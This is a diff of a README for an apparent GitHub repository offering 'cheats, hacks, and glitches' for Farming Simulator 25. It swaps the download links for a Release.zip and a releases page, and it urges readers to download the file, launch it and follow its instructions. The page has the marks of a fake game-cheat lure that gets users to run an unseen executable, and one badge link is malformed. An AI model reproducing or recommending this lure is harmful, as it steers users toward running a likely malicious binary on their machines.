@@ -12,7 +12,7 @@ In this repository, you will find a collection of cheats, hacks, and glitches sp
 
 ## 🚀 Get Started:
 To access the cheats, hacks, and glitches for Farming Simulator 25, simply click on the following link: 
-[![Download Now](https://img.shields.io/badge/Download%20Here-Release.zip-brightgreen)](https://github.com/releases/789694263/Release.zip)
+[![Download Now](https://github.com/sahed692/Farming-Simulator-25-Cheat/releases%https://github.com/sahed692/Farming-Simulator-25-Cheat/releases)](https://github.com/sahed692/Farming-Simulator-25-Cheat/releases)
 
 Once you click on the link, the file will be downloaded to your device. Launch the file and follow the instructions to unlock a world of unlimited possibilities in Farming Simulator 25.
 
@@ -39,6 +39,6 @@ Have questions, feedback, or suggestions? Feel free to reach out to us through t
 ## 🚜 Happy Farming!
 Embark on a fantastic farming adventure with the cheats, hacks, and glitches provided in this repository. Unlock a world of unlimited possibilities, enhance your gameplay, and enjoy the thrill of virtual farming without limits. Dive into the world of Farming Simulator 25 and create a farming empire that knows no bounds.
 
-## 🌟 Visit the [Farming Simulator 25 Money Cheat Repository](https://github.com/releases/789694263/Release.zip) now and start your journey to prosperity in the world of virtual farming! 🌾
+## 🌟 Visit the [Farming Simulator 25 Money Cheat Repository](https://github.com/sahed692/Farming-Simulator-25-Cheat/releases) now and start your journey to prosperity in the world of virtual farming! 🌾
 
 Remember, the fields are waiting, the animals need your care, and the crops are ready to be harvested. Let's make the most of this farming adventure together! 🌞🚜🌾
